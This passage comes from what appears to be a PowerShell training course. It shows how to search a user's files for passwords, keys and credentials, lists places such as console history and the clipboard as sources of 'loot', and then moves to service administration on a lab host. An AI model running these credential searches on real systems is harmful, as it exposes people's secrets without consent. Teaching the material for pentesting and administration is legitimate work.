<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                 <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>          <span class="hljs-comment">10/11/2022</span>  <span class="hljs-comment">3:32</span> <span class="hljs-comment">PM</span>            <span class="hljs-comment">183</span> <span class="hljs-comment">demo</span><span class="hljs-literal">-</span><span class="hljs-comment">notes</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>
<span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>            <span class="hljs-comment">4/4/2022</span>  <span class="hljs-comment">9:37</span> <span class="hljs-comment">AM</span>            <span class="hljs-comment">188</span> <span class="hljs-comment">q2</span><span class="hljs-literal">-</span><span class="hljs-comment">to</span><span class="hljs-literal">-</span><span class="hljs-comment">do</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>
<span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>          <span class="hljs-comment">10/12/2022</span> <span class="hljs-comment">11:26</span> <span class="hljs-comment">AM</span>             <span class="hljs-comment">14</span> <span class="hljs-comment">test</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>
<span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>            <span class="hljs-comment">1/4/2022</span> <span class="hljs-comment">11:23</span> <span class="hljs-comment">PM</span>            <span class="hljs-comment">310</span> <span class="hljs-comment">Untitled</span><span class="hljs-literal">-</span><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>

    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">C:\Users\MTanaka\Desktop\win</span><span class="hljs-literal">-</span><span class="hljs-comment">stuff</span>

<span class="hljs-comment">Mode</span>                 <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                 <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-comment">a</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>           <span class="hljs-comment">5/19/2021</span> <span class="hljs-comment">10:12</span> <span class="hljs-comment">PM</span>           <span class="hljs-comment">7831</span> <span class="hljs-comment">wmic</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>

    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">C:\Users\MTanaka\Desktop\Workshop\</span>

<span class="hljs-comment">Mode</span>                 <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                 <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>            <span class="hljs-comment">1/7/2022</span>  <span class="hljs-comment">4:39</span> <span class="hljs-comment">PM</span>            <span class="hljs-comment">945</span> <span class="hljs-comment">info</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>
</code></pre>
<p>This worked much more efficiently. We only returned the files that matched the file type <code>txt</code> because of our filter&#39;s <code>$_.Name</code> attribute. Now that we know it works, we can add the rest of the file types we will look for using an <code>-or</code> statement within the where filter.</p>
<p><strong>Using <code>Or</code> To Expand our Treasure Hunt</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}

 Directory: C:\Users\MTanaka\Desktop

Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a---          <span class="hljs-number">10</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">32</span> PM            <span class="hljs-number">183</span> demo-notes.txt
</span>-<span class="ruby">a---          <span class="hljs-number">10</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">22</span> AM           <span class="hljs-number">1286</span> github-creds.txt
</span>-<span class="ruby">a---            <span class="hljs-number">4</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span> AM            <span class="hljs-number">188</span> q2-to-<span class="hljs-keyword">do</span>.txt
</span>-<span class="ruby">a---           <span class="hljs-number">9</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span> PM             <span class="hljs-number">30</span> notes.txt
</span>-<span class="ruby">a---          <span class="hljs-number">10</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">26</span> AM             <span class="hljs-number">14</span> test.txt
</span>-<span class="ruby">a---           <span class="hljs-number">2</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">40</span> PM           <span class="hljs-number">3824</span> remote-connect.ps1
</span>-<span class="ruby">a---          <span class="hljs-number">10</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">22</span> PM            <span class="hljs-number">874</span> treats.ps1
</span>-<span class="ruby">a---            <span class="hljs-number">1</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">23</span> PM            <span class="hljs-number">310</span> Untitled-<span class="hljs-number">1</span>.txt
</span>
    Directory: C:\Users\MTanaka\Desktop\notedump\NoteDump

Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">47</span> PM           <span class="hljs-number">1092</span> demo.md
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM           <span class="hljs-number">1074</span> noteDump.py
</span>-<span class="ruby">a---           <span class="hljs-number">4</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM            <span class="hljs-number">375</span> README.md</span>
</code></pre>
<p>Our string worked, and we are now retrieving <code>multiple filetypes</code> from Get-ChildItem! Now that we have our list of interesting files, we could turn around and <code>pipe</code> those objects into another cmdlet (<code>Select-String</code>) that searches through their content for interesting strings and keywords or phrases. Let us see this in action.</p>
<p><strong>Basic Search Query</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-ChildItem -Path C:\Users\MTanaka\ -Filter <span class="hljs-string">"*.txt"</span> -Recurse -File | sls <span class="hljs-string">"Password"</span>,<span class="hljs-string">"credential"</span>,<span class="hljs-string">"key"</span>

CFP-Notes.tx<span class="hljs-variable">t:99</span>:Lazzaro, <span class="hljs-keyword">N</span>. (<span class="hljs-number">2004</span>). Why we play game<span class="hljs-variable">s:</span> Four <span class="hljs-built_in">keys</span> <span class="hljs-keyword">to</span> more emotion without story. Retrieved from:
notes.tx<span class="hljs-variable">t:3</span>:- Password: F@ll2022!
wmic.tx<span class="hljs-variable">t:67</span>:  wmic netlogin <span class="hljs-built_in">get</span> name,badpasswordcount
wmic.tx<span class="hljs-variable">t:69</span>:Are the screensavers password protected? What <span class="hljs-keyword">is</span> the timeout? good use: see that <span class="hljs-keyword">all</span> systems are
complying with policy evil use: <span class="hljs-keyword">find</span> systems <span class="hljs-keyword">to</span> walk <span class="hljs-keyword">up</span> <span class="hljs-built_in">and</span> use (assuming physical access <span class="hljs-keyword">is</span> <span class="hljs-keyword">an</span> option)
</code></pre>
<p>Keep in mind, Select-string is <code>not</code> case sensitive by default. If we wish for it to be, we can feed it the -CaseSensitive modifier. Now we will combine our original file search with our content filter.</p>
<p><strong>Combining the Searches</strong></p>
<p>Finding &amp; Filtering Content</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like <span class="hljs-string">"*.txt"</span> -<span class="hljs-built_in">or</span> $_. Name -like <span class="hljs-string">"*.py"</span> -<span class="hljs-built_in">or</span> $_. Name -like <span class="hljs-string">"*.ps1"</span> -<span class="hljs-built_in">or</span> $_. Name -like <span class="hljs-string">"*.md"</span> -<span class="hljs-built_in">or</span> $_. Name -like <span class="hljs-string">"*.csv"</span>)} | sls <span class="hljs-string">"Password"</span>,<span class="hljs-string">"credential"</span>,<span class="hljs-string">"key"</span>,<span class="hljs-string">"UserName"</span>

New-PC-Setup.md:<span class="hljs-number">56</span>:  - getting your vpn key
CFP-Notes.tx<span class="hljs-variable">t:99</span>:Lazzaro, <span class="hljs-keyword">N</span>. (<span class="hljs-number">2004</span>). Why we play game<span class="hljs-variable">s:</span> Four <span class="hljs-built_in">keys</span> <span class="hljs-keyword">to</span> more emotion without story. Retrieved from:
notes.tx<span class="hljs-variable">t:3</span>:- Password: F@ll2022!
wmic.tx<span class="hljs-variable">t:54</span>:  wmic computersystem <span class="hljs-built_in">get</span> username
wmic.tx<span class="hljs-variable">t:67</span>:  wmic netlogin <span class="hljs-built_in">get</span> name,badpasswordcount
wmic.tx<span class="hljs-variable">t:69</span>:Are the screensavers password protected? What <span class="hljs-keyword">is</span> the timeout? good use: see that <span class="hljs-keyword">all</span> systems are
complying with policy evil use: <span class="hljs-keyword">find</span> systems <span class="hljs-keyword">to</span> walk <span class="hljs-keyword">up</span> <span class="hljs-built_in">and</span> use (assuming physical access <span class="hljs-keyword">is</span> <span class="hljs-keyword">an</span> option)
wmic.tx<span class="hljs-variable">t:83</span>:  wmic netuse <span class="hljs-built_in">get</span> Name,username,connectiontype,localname
</code></pre>
<p>Our commands in the pipeline are getting longer, but we can easily clean up our view to make it readable. Looking at our results, though, it was a much smoother process to feed our file list results into our keyword search. Notice that there are a few <code>new</code> additions in our command string. We added a line to have the command continue if an error occurs (<code>-ErrorAction SilentlyContinue</code>). This helps us to ensure that our entire pipeline stays intact when it happens along a file or directory it cannot read. Finding and filtering content can be an interesting puzzle in and of itself. Determining what words and strings will produce the best results is an ever-evolving task and will often vary based on the customer.</p>
<h4 id="helpful-directories-to-check">Helpful Directories to Check</h4>
<p>While looking for valuable files and other content, we can check many more valuable files in many different places. The list below contains just a few tips and tricks that can be used in our search for loot.</p>
<ul>
<li>Looking in a Users <code>\AppData\</code> folder is a great place to start. Many applications store <code>configuration files</code>, <code>temp saves</code> of documents, and more.</li>
<li>A Users home folder <code>C:\Users\User\</code> is a common storage place; things like VPN keys, SSH keys, and more are stored. Typically in <code>hidden</code> folders. (<code>Get-ChildItem -Hidden</code>)</li>
<li>The Console History files kept by the host are an endless well of information, especially if you land on an administrator&#39;s host. You can check two different points:<ul>
<li><code>C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></li>
<li><code>Get-Content (Get-PSReadlineOption).HistorySavePath</code></li>
</ul>
</li>
<li>Checking a user&#39;s clipboard may also yield useful information. You can do so with <code>Get-Clipboard</code></li>
<li>Looking at Scheduled tasks can be helpful as well.</li>
</ul>
<p>These are just a few interesting places to check. Use it as a starting point to build and maintain your own checklist as your skill and experiences grow.</p>
<hr>
<p>We are growing our CLI Kung Fu quickly, and it&#39;s time to move on to the next challenge. As you progress, please try the examples shown on your own to get a feel for what can be done and how you can modify them. We are jumping into working with Services and processes for our next lesson.</p>
<h2 id="working-with-services">Working with Services</h2>
<hr>
<p>In our previous section, we discussed filtering and the pipeline using an example of finding services on the host from the eyes of a pentester. In this section, we will dive deeper into this and flip it on its head. We are going to look at it from the eyes of an administrator.</p>
<p>Scenario: Mr. Tanaka messaged the Helpdesk stating that he noticed a window pop up earlier in the day and thought it was just Windows updates running, as lots of information flashed by in the window. However, now he reports that alerts stating that Defender is turned off also popped up, and his host is acting sluggish. We need to look into this, determine what services related to Defender are shut off, and enable them again if we can. Later we will look into the event logs and see what happened.</p>
<p>Service administration is crucial in managing hosts and ensuring our security posture remains unchanged. This section will cover how to query, start, stop, and edit services and their permissions as needed. We will also discuss ways to interact with them locally and remotely. It is time to dive in and acquire our next CLI Kung-Fu Belt.</p>
<hr>
<h3 id="what-are-services-and-how-do-we-interact-with-them-using-powershell-">What Are Services and How Do We Interact with Them Using Powershell?</h3>
<p>Services in the Windows Operating system at their core are singular instances of a component running in the background that manages and maintains processes and other needed components for applications used on the host. Services usually do not require interaction from the user and have no tangible interface for them to interact with. They also exist as a singular instance of the service on the host, while a service can maintain multiple instances of a process. A process can be considered a temporary container for a user or application to perform tasks. Windows has three categories of services: Local Services, Network Services, and System Services. Many different services (including the core components within the Windows operating system) handle multiple instances of processes simultaneously. PowerShell provides us with the module <code>Microsoft.PowerShell.Management</code>, which contains several cmdlets for interacting with Services. As with everything in PowerShell, if you are unsure where to start or what cmdlet you need, take advantage of the built-in help to get you started.</p>
<p><strong>Getting Help (Services)</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Help *-Service  

Name                              Category  Module                    Synopsis
----                              --------  ------                    --------
Get-Service                       Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
New-Service                       Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Remove-Service                    Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Restart-Service                   Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Resume-Service                    Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Set-Service                       Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Start-Service                     Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Stop-Service                      Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
Suspend-Service                   Cmdlet    Microsoft<span class="hljs-selector-class">.PowerShell</span><span class="hljs-selector-class">.Man</span>… …
</code></pre>
<p>Now, let us start our triage of Mr. Tanaka&#39;s host and see what is going on.</p>
<p>Note: Keep in mind that to manage or modify services outside of running queries, we will need to have the correct permissions to do so. This means our user should ideally be a local administrator on the host or have been given the permissions from the domain groups they are a member of. Opening PowerShell in an administrative context would also work.</p>
<hr>
<h4 id="investigating-running-services">Investigating Running Services</h4>
<p>We first need to get a quick running list of services from our target host. Services can have a status set as Running, Stopped, or Paused and can be set up to start manually (user interaction), automatically (at system startup), or on a delay after system boot. Users with administrative privileges can usually create, modify, and delete services. Misconfigurations around service permissions are a common privilege escalation vector on Windows systems.</p>
<p><strong>Get-Service</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Service | ft DisplayName,Status 

DisplayName                                                                         Status
-----------                                                                         ------

Adobe Acrobat Update Service                                                       Running
OpenVPN Agent agent_ovpnconnect                                                    Running
Adobe Genuine <span class="hljs-literal">Monitor</span> Service                                                      Running
Adobe Genuine Software Integrity Service                                           Running
Application Layer Gateway Service                                                  <span class="hljs-literal">Stopped</span>
Application Identity                                                               <span class="hljs-literal">Stopped</span>
Application <span class="hljs-literal">Inf</span>ormation                                                            Running
Application Management                                                             <span class="hljs-literal">Stopped</span>
App Readiness                                                                      <span class="hljs-literal">Stopped</span>
Microsoft App-V Client                                                             <span class="hljs-literal">Stopped</span>
AppX Deployment Service (AppXSVC)                                                  Running
AssignedAccessManager Service                                                      <span class="hljs-literal">Stopped</span>
Windows Audio Endpoint Builder                                                     Running
Windows Audio                                                                      Running
ActiveX Installer (AxInstSV)                                                       <span class="hljs-literal">Stopped</span>
GameDVR <span class="hljs-keyword">and</span> Broadcast <span class="hljs-keyword">User</span> <span class="hljs-title">Service_172433</span>                                          <span class="hljs-literal">Stopped</span>
BitLocker Drive Encryption Service                                                 Running
Base Filtering Engine                                                              Running
<span class="hljs-tag">&lt;SNIP&gt;</span> 

PS C:\htb&gt; Get-Service | measure  

Count             : <span class="hljs-number">321</span>
</code></pre>
<p>To make it a little clearer to run, we piped our service listing into <code>format-table</code> and chose the properties <code>DisplayName</code> and <code>Status</code> to display in our console. On the second command issued, we measured the number of services that appear in the listing just to get a sense of how many we are working with. <code>321</code> services are a lot to scroll through and work with at once, so we need to pare it down a bit more. From Mr. Tanaka&#39;s request, he mentioned a potential issue with Windows Defender, so let us filter out any services not related to that.</p>
<p><strong>Precision Look at Defender</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Get</span>-Service | <span class="hljs-keyword">where</span> DisplayName -<span class="hljs-keyword">like</span> <span class="hljs-comment">'*Defender*' | ft DisplayName,ServiceName,Status</span>

DisplayName                                             ServiceName  Status
-----------                                             -----------  ------
Windows Defender Firewall                               mpssvc      Running
Windows Defender Advanced Threat Protection Service     Sense       Stopped
Microsoft Defender Antivirus Network Inspection Service WdNisSvc    Running
Microsoft Defender Antivirus Service                    WinDefend   Stopped
</code></pre>
<p>Now we can see just the services related to <code>Defender,</code> and we can see that for some reason, the Microsoft Defender Antivirus Service (<code>WinDefend</code>) is indeed turned off. For now, to ensure the protection of Mr. Tanaka&#39;s host, let us try and turn it back on using the Start-Service cmdlet.</p>
<p><strong>Resume / Start / Restart a Service</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Start-Service W<span class="hljs-keyword">in</span>Defend
</code></pre>
<p>As we ran the cmdlet <code>Start-Service</code> as long as we did not get an error message like <code>&quot;ParserError: This script contains malicious content and has been blocked by your antivirus software.&quot;</code> or others, the command executed successfully. We can check again by querying the service.</p>
<p><strong>Checking Our Work</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span>  <span class="hljs-built_in">get-service</span> <span class="hljs-string">WinDefend
</span>
<span class="hljs-string">Status </span>  <span class="hljs-string">Name </span>              <span class="hljs-string">DisplayName
</span>------   ----               -----------
<span class="hljs-string">Running </span> <span class="hljs-string">WinDefend </span>         <span class="hljs-string">Microsoft </span><span class="hljs-string">Defender </span><span class="hljs-string">Antivirus </span><span class="hljs-string">Service</span>
</code></pre>
<p>Notice how we utilized the service <code>Name</code> to start and query the service instead of anything in the DisplayName. For now, Defender is back up and running, so the first mission is accomplished. While here, let us look around and see what else is happening. As we look through the services a bit more to see what is there, we notice a Service with an odd DisplayName.</p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-built_in">get-service</span> 

<span class="hljs-string">Stopped </span> <span class="hljs-string">SmsRouter </span>         <span class="hljs-string">Microsoft </span><span class="hljs-string">Windows </span><span class="hljs-string">SMS </span><span class="hljs-string">Router </span><span class="hljs-string">Service.</span>
<span class="hljs-string">Stopped </span> <span class="hljs-string">SNMPTrap </span>          <span class="hljs-string">SNMP </span><span class="hljs-string">Trap
</span><span class="hljs-string">Stopped </span> <span class="hljs-string">spectrum </span>          <span class="hljs-string">Windows </span><span class="hljs-string">Perception </span><span class="hljs-string">Service
</span><span class="hljs-string">Running </span> <span class="hljs-string">Spooler </span>           <span class="hljs-string">Totally </span><span class="hljs-string">still </span><span class="hljs-string">used </span><span class="hljs-string">for </span><span class="hljs-string">Print </span><span class="hljs-string">Spooli.</span>..
<span class="hljs-string">Stopped </span> <span class="hljs-string">sppsvc </span>            <span class="hljs-string">Software </span><span class="hljs-string">Protection
</span><span class="hljs-string">Running </span> <span class="hljs-string">SSDPSRV </span>           <span class="hljs-string">SSDP </span><span class="hljs-string">Discovery</span>
</code></pre>
<p>We cannot find any information on this particular service, and its DisplayName having changed is odd, so to be safe, we will stop the service for now and let one of our team members on the security team investigate it.</p>
<p><strong>Stopping a Service</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Stop</span>-Service Spooler 

PS C:\htb&gt; Get-Service Spooler 

<span class="hljs-keyword">Status</span>   <span class="hljs-keyword">Name</span>               DisplayName
------   ----               -----------
Stopped  spooler            Totally still used for <span class="hljs-built_in">Print</span> Spooli...
</code></pre>
<p>Now we can see that using the Stop-Service, we stopped the operating status of the <code>Spooler</code> service. Now that we have stopped the service let us set the startup type of the service now from Automatic to Disabled until further investigation can be taken.</p>
<p><strong>Set-Service</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName

Name    StartType  Status DisplayName
<span class="hljs-bullet">----    </span>---------  ------ -----------
spooler Automatic Stopped Totally still used for Print Spooling...


PS C:\htb&gt; Set-Service -Name Spooler -StartType Disabled

PS C:\htb&gt; Get-Service -Name Spooler | Select-Object -Property StartType 

<span class="hljs-section">StartType
---------</span>
<span class="hljs-code"> Disabled</span>
</code></pre>
<p>Ok, now our Spooler service has been stopped, and its Startup changed to Disabled for now. Modifying a running service is reasonably straightforward. Ensure that if you attempt to make any modifications, you are an Administrator for the host or on the domain. Removing services in PowerShell is difficult right now. The cmdlet <code>Remove-Service</code> only works if you are using PowerShell version 7. By default, our hosts will open and run PowerShell version 5.1. For now, if you wish to remove a service and its entries, use the <code>sc.exe</code> tool.</p>
<hr>
<h3 id="how-do-we-interact-with-remote-services-using-powershell-">How Do We Interact with Remote Services using PowerShell?</h3>
<p>Now that we know how to work with services, let us look at how we can interact with remote hosts. Since Mr. Tanaka&#39;s host is in a domain, we can easily query and check the running services on other hosts. The <code>-ComputerName</code> parameter allows us to specify that we want to query a remote host.</p>
<p><strong>Remotely Query Services</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-built_in">get-service</span> -<span class="hljs-string">ComputerName </span><span class="hljs-string">ACADEMY-ICL-</span><span class="hljs-string">DC
</span>
<span class="hljs-string">Status </span>  <span class="hljs-string">Name </span>              <span class="hljs-string">DisplayName
</span>------   ----               -----------
<span class="hljs-string">Running </span> <span class="hljs-string">ADWS </span>              <span class="hljs-string">Active </span><span class="hljs-string">Directory </span><span class="hljs-string">Web </span><span class="hljs-string">Services
</span><span class="hljs-string">Stopped </span> <span class="hljs-string">AppIDSvc </span>          <span class="hljs-string">Application </span><span class="hljs-string">Identity
</span><span class="hljs-string">Stopped </span> <span class="hljs-string">AppMgmt </span>           <span class="hljs-string">Application </span><span class="hljs-string">Management
</span><span class="hljs-string">Stopped </span> <span class="hljs-string">AppReadiness </span>      <span class="hljs-string">App </span><span class="hljs-string">Readiness
</span><span class="hljs-string">Stopped </span> <span class="hljs-string">AppXSvc </span>           <span class="hljs-string">AppX </span><span class="hljs-string">Deployment </span><span class="hljs-string">Service </span>(<span class="hljs-string">AppXSVC)</span>
<span class="hljs-string">Running </span> <span class="hljs-string">BFE </span>               <span class="hljs-string">Base </span><span class="hljs-string">Filtering </span><span class="hljs-string">Engine
</span><span class="hljs-string">Stopped </span> <span class="hljs-string">BITS </span>              <span class="hljs-string">Background </span><span class="hljs-string">Intelligent </span><span class="hljs-string">Transfer </span><span class="hljs-string">Ser.</span>..
&lt;<span class="hljs-string">SNIP&gt;</span>
</code></pre>
<p><strong>Filtering our Output</strong></p>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {<span class="hljs-symbol">$</span>_.Status -<span class="hljs-keyword">eq</span> <span class="hljs-string">"Running"</span>}

Status   Name               DisplayName
------   ----               -----------
Running  ADWS               Active Directory Web Services
Running  BFE                Base Filtering Engine
Running  COMSysApp          COM+ <span class="hljs-keyword">System</span> Application
<span class="hljs-function"><span class="hljs-title">Running</span></span>  CoreMessagingRe... CoreMessaging
Running  CryptSvc           Cryptographic Services
Running  DcomLaunch         DCOM Server Process Launcher
Running  Dfs                DFS Namespace
Running  DFSR               DFS Replication
</code></pre>
<p>One interesting thing of note here is that since PowerShell handles everything as an <code>object</code>, even the output from a remote command, we can use the PowerShell pipeline to dissect an object&#39;s properties with <code>Where-Object</code>. Our results returned only the services with a status when it was run of <code>Running</code>. We can use these combinations for any number of things. One great example would be to query our hosts for a specific property, such as if the status was Running, if a DisplayName is set to something specific, etc. Regarding remote interactions, we can also use the <code>Invoke-Command</code> cmdlet. Let us try and query multiple hosts and see the status of the <code>UserManager</code> service.</p>
<h4 id="invoke-command">Invoke-Command</h4>
<p>Working with Services</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt;<span class="hljs-built_in"> invoke-command </span>-ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}

Status   Name               DisplayName                            PSComputerName
------   ----               -----------                            --------------
Running  windefend          Microsoft Defender Antivirus Service   LOCALHOST
Running  windefend          Windows Defender Antivirus Service     ACADEMY-ICL-DC
</code></pre>
<p>Let us break this down now:</p>
<ul>
<li><code>Invoke-Command</code>: We are telling PowerShell that we want to run a command on a local or remote computer.</li>
<li><code>Computername</code>: We provide a comma-defined list of computer names to query.</li>
<li><code>ScriptBlock {commands to run}</code>: This portion is the enclosed command we want to run on the computer. For it to run, we need it to be enclosed in {}.</li>
</ul>
<p>Interacting with hosts in this manner can expedite much of our work.</p>
<p><strong>Scenario: Earlier in this section, we saw a service (Spooler) that had a DisplayName that was modified. This could potentially clue us in on an issue within our environment. Using the <code>-ComputerName</code> parameter or the Invoke-Command cmdlet to query all of the hosts within our environment and check the DisplayName properties to see if any other host has been affected. As an administrator, having access to this kind of power is invaluable and can often help reduce the time a threat is on the host and help get ahead of the issue and work to kick the threat out.</strong></p>
<hr>
<p>Understanding services and managing them on a host is essential from an admin and pentester perspective. We can do a lot with them, including anything from privilege escalation, to persistence and more. Moving on to our next section, we will introduce the Windows Registry and how to interact with it on a Windows host.</p>
<h2 id="working-with-the-registry">Working with the Registry</h2>
<hr>
<p>We should be comfortable with the CLI at this point. It&#39;s time to level our skills again and tackle one of the more complicated aspects of the Windows operating system, the <code>Registry</code>. This section will walk us through what the Registry is, how to navigate it, and how to read key/value pairs and make changes to it as needed.</p>
<hr>
<h3 id="what-is-the-windows-registry-">What Is The Windows Registry?</h3>
